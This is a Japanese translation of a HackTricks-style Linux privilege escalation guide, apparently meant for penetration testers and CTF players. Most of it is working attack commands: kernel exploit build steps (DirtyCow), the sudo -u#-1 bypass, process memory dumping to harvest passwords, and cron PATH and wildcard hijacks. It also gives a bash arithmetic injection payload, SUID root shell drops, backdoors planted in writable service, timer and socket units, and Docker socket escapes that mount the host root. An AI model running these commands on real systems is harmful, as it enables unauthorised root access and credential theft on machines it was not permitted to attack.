# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSについての情報収集を始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし`PATH`変数内の任意のフォルダに**書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります：
```bash
echo $PATH
```
### Env info

興味深い情報、passwords、または API keys が environment variables に含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel のバージョンを確認し、privilege escalation に利用できる exploit がないか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良質な脆弱な kernel の一覧や、既に **compiled exploits** になっているものをいくつかここで見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploit のみチェック)

Always **Googleで kernel version を検索してください**。お使いの kernel version が既存の kernel exploit に記載されている場合があり、そうすればその exploit が有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に表示される脆弱な sudo バージョンに基づき:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

寄稿: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗

この vuln がどのように悪用され得るかの **例** は **smasher2 box of HTB** を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container 内にいる場合、そこから脱出を試みることができます：

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何が **mounted** で何が **unmounted** か、どこにあり、なぜかを確認してください。もし何かが **unmounted** なら、それを **mount** して機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploitを使用する必要がある場合に役立ちます。実行するマシン（またはそれに類似したマシン）でコンパイルすることが推奨されているためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされている脆弱なソフトウェア

**インストール済みパッケージやサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、それが権限昇格に悪用される可能性があります…\  
疑わしいソフトウェアについては、バージョンを手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、マシン内にインストールされている古いソフトウェアや脆弱なソフトウェアをチェックするために**openVAS**を使用することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、そのほとんどはあまり有用ではないため、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱でないかを確認するために、OpenVASなどのツールの使用を推奨します_

## プロセス

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来持つべきより多い権限を持っているか**をチェックしてください（例えば tomcat が root によって実行されている等）。
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
また、**プロセスのバイナリに対する権限を確認してください**。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

プロセスをモニターするために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときに識別するのに非常に有用です。

### Process memory

サーバのいくつかのサービスは、**credentials in clear text inside the memory** を保存することがあります。\
通常、他のユーザに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常すでに root でありさらに credentials を見つけたい場合により有用です。\
ただし、**as a regular user you can read the memory of the processes you own** という点を忘れないでください。

> [!WARNING]
> 現在の多くのマシンは **don't allow ptrace by default** という点に注意してください。これは、権限の低いユーザが所有する他のプロセスをダンプできないことを意味します。
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできる。これは従来の ptrace の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使用できるのは管理者のみ（CAP_SYS_PTRACE が必要）。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはない。これに設定すると、ptrace を再び有効にするには再起動が必要。

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps はそのプロセス内でメモリがどのようにマッピングされているかを示します** 仮想アドレス空間; また **各マッピング領域の権限** を示します。**mem** 擬似ファイルは **プロセスのメモリそのものを公開します**。**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそのオフセットがわかります。この情報を使って **memファイル内をシークして読み取り可能な領域をすべてファイルにダンプする**。.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスを提供し、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux向け ProcDump

ProcDumpは、SysinternalsスイートのWindows向けにある古典的なProcDumpツールをLinux向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次のものを使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でrootの制約を取り除き、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### プロセスのメモリからの認証情報

#### 手動の例

authenticator プロセスが実行中である場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpできます（前のセクションを参照して、processのmemoryをdumpするさまざまな方法を見つけてください）そしてmemory内で認証情報を検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は **メモリから平文の認証情報を盗み**、いくつかの**よく知られたファイル**からも取得します。適切に動作させるには root権限 が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が root で実行されている – web-based scheduler privesc

web “Crontab UI” パネル (alseambusher/crontab-ui) が root で実行され、loopback にのみバインドされている場合でも、SSH のローカルポートフォワーディング経由で到達して、特権ジョブを作成して権限昇格できます。

典型的な手順
- ループバック限定のポート（例: 127.0.0.1:8000）と Basic-Auth リームを `ss -ntlp` / `curl -v localhost:8000` で発見する
- 運用アーティファクトから資格情報を見つける:
  - バックアップ/スクリプト（`zip -P <password>`）
  - systemd unit が `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を設定している
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- high-priv ジョブを作成してすぐに実行する（SUID shell をドロップする）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使い方:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root で実行しない。専用ユーザを用意し、最小限の権限に制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files に秘密を埋め込まない。secret stores や root のみが読める EnvironmentFile を使用する
- on-demand job executions に対して audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認する。root によって実行される script を悪用できるかもしれない（wildcard vuln? root が使うファイルを変更できるか? symlinks を使えるか? root が使うディレクトリに特定のファイルを作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ 内には次の PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(ユーザ "user" が /home/user に対して書き込み権限を持っている点に注意)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとする場合、例えば: _\* \* \* \* root overwrite.sh_\
すると、次のようにして root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使用する場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しない動作（例えば privesc）を引き起こすことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **、脆弱ではありません（_**./\***_** ですら脆弱ではありません）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bashは、((...))、$((...)) および let の算術評価の前に parameter expansion と command substitution を実行します。もし root が実行する cron/parser が信頼できないログフィールドを読み取りそれを算術コンテキストに渡すと、攻撃者はコマンド置換 $(...) を注入でき、cron 実行時に root として実行されます。

- Why it works: Bashでは、展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は最初に置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく継続します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 攻撃者が制御するテキストをパースされるログに書き込み、数値に見えるフィールドにコマンド置換を含め末尾を数字で終わらせます。コマンドが stdout に出力しない（またはリダイレクトする）ようにしておくと算術が有効なままになります。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

もし root によって実行される **cron script を変更できる** 場合、非常に簡単に **shell** を取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが**directory where you have full access**を使用している場合、そのフォルダを削除して、あなたが管理するscriptを置いた別の場所を指す**create a symlink folder to another one**を作ると有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1、2、または5分ごとに実行されているプロセスを探すことができます。これを利用して escalate privileges できるかもしれません。

例えば、**1分間に0.1秒ごとに監視し**、**実行回数の少ないコマンドでソートし**、最も実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します).

### 見えない cron jobs

**コメントの後にキャリッジリターンを入れる**（改行文字なし）ことでcronjobを作成でき、cronjobは動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込み可能であれば、**それを変更して**サービスが**起動したとき**、**再起動したとき**、または**停止したとき**に**バックドアを実行させる**ことができます（場合によってはマシンを再起動するまで待つ必要があります）。\
例えば、.service ファイル内にバックドアを作成し、**`ExecStart=/tmp/script.sh`** を設定します

### 書き込み可能なサービスバイナリ

**サービスによって実行されているバイナリに対して書き込み権限がある**場合、それらをバックドアに差し替えることができ、サービスが再実行されたときにバックドアが実行されます。

### systemd PATH - 相対パス

次のコマンドで**systemd**が使用するPATHを確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが判明した場合、**escalate privileges**できる可能性があります。次のようなサービス設定ファイルで**relative paths being used on service configurations**が使われている箇所を探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH folder 内に、**executable** を **same name as the relative path binary** で作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor will be executed**。（特権のないユーザーは通常サービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

タイマーは名前が `**.timer**` で終わる systemd の unit ファイルで、`**.service**` ファイルやイベントを制御します。タイマーはカレンダー時間イベントや単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

timer を変更できる場合、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> この timer が満了したときにアクティベートされる Unit です。引数はユニット名で、そのサフィックスは ".timer" ではありません。指定しない場合、この値はサフィックスを除いて timer ユニットと同じ名前の service にデフォルトされます。（上記参照）アクティベートされるユニット名と timer ユニットのユニット名は、サフィックス以外は同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- systemd ユニット（例: `.service`）の中で、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスを実行している** systemd ユニットを見つけ、かつ **書き込み権限** を **systemd PATH** に対して持っている（その実行ファイルを偽装するため）

**詳しくは `man systemd.timer` を参照してください。**

### **Timer を有効化する**

Timer を有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unix Domain Sockets (UDS) は、クライアント-サーバーモデル内で同一または別のマシン間での**プロセス間通信**を可能にします。これらは標準の Unix ディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

ソケットは `.socket` ファイルを使用して設定できます。

**ソケットについて詳しくは `man systemd.socket` を参照してください。** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットがどこで待ち受けるか（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 やポート番号など）を**指定**します。
- `Accept`: ブール引数を取ります。もし `true` であれば、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。もし `false` であれば、すべてのリッスンソケット自体が**起動されたサービスユニットに渡され**、すべての接続に対して単一のサービスユニットだけが生成されます。この値はデータグラムソケットや FIFO では無視され、単一のサービスユニットがすべての着信トラフィックを無条件に処理します。**デフォルトは false**です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法で書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする**ソケット**/FIFO が作成およびバインドされる前後にそれぞれ**実行**されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFO がクローズされ削除される前後にそれぞれ**実行**される追加の**コマンド**です。
- `Service`: 着信トラフィック時に**起動する**サービスユニット名を指定します。この設定は `Accept=no` のソケットでのみ許可されます。デフォルトではソケットと同名のサービス（サフィックスを置き換えたもの）が使用されます。ほとんどの場合、このオプションを使用する必要はありません。

### Writable .socket files

書き込み可能な `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**でき、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があります。**\
_システムがそのソケットファイルの設定を使用している必要があり、そうでなければバックドアは実行されません_

### Writable sockets

もし**書き込み可能なソケット**を特定できたら（ここで言うのは構成の `.socket` ファイルではなく Unix ソケット本体のことです）、そのソケットと**通信する**ことができ、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意：一部に **sockets listening for HTTP** リクエストが存在する場合があります（_ここで言っているのは .socket files ではなく、unix sockets として動作するファイルのことです_）。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **HTTP リクエストに応答する** なら、**通信** が可能で、場合によっては **脆弱性を exploit する** ことができます。

### 書き込み可能な Docker socket

Docker socket（多くの場合 `/var/run/docker.sock` にあります）は保護すべき重要なファイルです。デフォルトでは、`root` ユーザーおよび `docker` グループのメンバーが書き込み可能です。この socket への書き込みアクセスを持つと、privilege escalation を引き起こす可能性があります。以下に、その実行方法と Docker CLI が利用できない場合の代替手段を示します。

#### **Privilege Escalation with Docker CLI**

Docker socket に書き込みアクセスがある場合、以下のコマンドを使用して権限を昇格できます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使用してコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、ホストのファイルシステムに対して root 権限でコンテナ内から直接コマンドを実行できます。

### その他

docker socket に対して書き込み権限がある（**inside the group `docker`** に属している）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) があります。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) 。

docker からの脱出や権限昇格に悪用するその他の方法については、以下を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度なプロセス間通信（IPC）システムであり、アプリケーション間の効率的な相互作用とデータ共有を可能にします。現代の Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは汎用性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、強化された UNIX ドメインソケットに似た役割を果たします。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth デーモンからの着信通知が音楽プレーヤーをミュートするよう促すなど、ユーザー体験を向上させます。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は許可/拒否モデルで動作し、ポリシールールの累積的な一致に基づいてメッセージの許可（メソッド呼び出し、シグナル送信など）を管理します。これらのポリシーは bus とのやり取りを指定し、これらの権限の悪用によって権限昇格が可能になる場合があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるようなポリシーの例があり、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、送信および受信する権限を持つことが詳細に記載されています。

ユーザーまたはグループが指定されていないポリシーは普遍的に適用され、一方で "default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信を enumerate および exploit する方法を学んでください:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を特定するのは常に興味深いです。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に操作できなかったマシン上で動作しているネットワークサービスを必ず確認してください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic ができるか確認してください。できれば、credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

自分が**who**であるか、どの**privileges**を持っているか、システムにどの**users**がいるか、どの**users**が**login**できるか、どの**users**が**root privileges**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

